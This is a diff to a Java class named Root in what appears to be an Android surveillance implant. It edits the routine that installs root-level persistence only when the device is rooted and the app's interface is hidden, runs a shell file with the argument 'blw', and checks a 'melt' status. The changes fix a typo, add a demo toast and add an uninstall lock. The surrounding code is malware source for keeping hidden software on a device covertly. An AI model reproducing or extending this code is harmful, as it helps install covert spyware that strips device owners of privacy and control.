@@ -389,23 +389,23 @@ public class Root {
 	static synchronized boolean installPersistence(Boolean forceInstall) {
 		android.content.pm.PackageInfo pi = null;
 		String apkPosition = null;
-		Boolean isPersisten = false;
+		Boolean isPersistent = false;
 
 		if ((apkPosition = Status.getApkName()) != null && !Status.isMelt()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
 			}
-			isPersisten = Status.isPersistent();
+			isPersistent = Status.isPersistent();
 		} else {
 			return false;
 		}
 
-		if (isPersisten || Status.persistencyReady()) {
+		if (isPersistent || Status.persistencyReady()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (installPersistence): already persistent!! ");
 			}
 
-			delOldFileMarkup(isPersisten);
+			delOldFileMarkup(isPersistent);
 
 			if (Status.needReboot()) {
 				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT_TOREBOOT);
@@ -413,6 +413,10 @@ public class Root {
 				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT);
 			}
 			return true;
+		}
+
+		if(Cfg.DEMO){
+			Status.self().makeToast("Install Persistence");
 		}
 
 		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
@@ -801,14 +805,17 @@ public class Root {
 	}
 
 
-	public static synchronized void installPersistence() {
+	public static  void installPersistence() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (installPersistence): tryInstall PERSISTENCE=" + Cfg.PERSISTENCE + " root=" + Status.haveRoot() + " status=" + Status.getPersistencyStatus() + " isGuiVisible= " +
 					Status.isGuiVisible());
 		}
-		if (Cfg.PERSISTENCE && Status.haveRoot() && Status.getPersistencyStatus() == Status.PERSISTENCY_STATUS_TO_INSTALL && !Status.isGuiVisible()) {
-			Root.installPersistence(false);
-			Status.self().setReload();
+
+		synchronized(Status.uninstallLock) {
+			if (Cfg.PERSISTENCE && Status.haveRoot() && Status.uninstall && Status.getPersistencyStatus() == Status.PERSISTENCY_STATUS_TO_INSTALL && !Status.isGuiVisible()) {
+				Root.installPersistence(false);
+				Status.self().setReload();
+			}
 		}
 	}
 
